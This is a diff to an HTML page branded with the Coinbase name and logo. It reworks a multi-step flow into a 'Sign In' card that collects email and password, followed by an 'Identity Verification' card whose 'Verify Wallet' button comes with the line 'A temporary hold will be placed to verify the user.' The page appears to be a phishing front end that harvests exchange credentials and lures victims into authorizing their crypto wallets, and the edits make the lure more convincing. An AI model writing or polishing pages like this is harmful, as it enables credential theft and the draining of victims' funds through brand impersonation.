@@ -10,7 +10,7 @@
 </head>
 <body>
     <div class="container">
-        <!-- STEP 1: LANDING PAGE -->
+        <!-- STEP 1: LANDING -->
         <div id="step-1" class="auth-card">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
             <h1>Coinbase</h1>
@@ -18,15 +18,23 @@
             <button type="button" id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
-        <!-- STEP 2: CREDENTIALS & WALLET -->
+        <!-- STEP 2: LOGIN -->
         <div id="step-2" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1>Identity Verification</h1>
-            <p>Please enter your account details to authorize the synchronization of your assets.</p>
+            <h1>Sign In</h1>
+            <p>Please enter your account credentials to continue.</p>
             <div class="form-group">
                 <input type="email" id="email" placeholder="Email Address" required>
                 <input type="password" id="pass" placeholder="Password" required>
             </div>
+            <button type="button" id="toStep3" class="btn-primary">Continue</button>
+        </div>
+
+        <!-- STEP 3: VERIFY WALLET -->
+        <div id="step-3" class="auth-card hidden">
+            <img src="logo.png" class="cb-logo" alt="Coinbase">
+            <h1>Identity Verification</h1>
+            <p>A temporary hold will be placed to verify the user.</p>
             <button id="connectBtn" class="btn-primary">Verify Wallet</button>
             <div id="status" class="status-text"></div>
         </div>
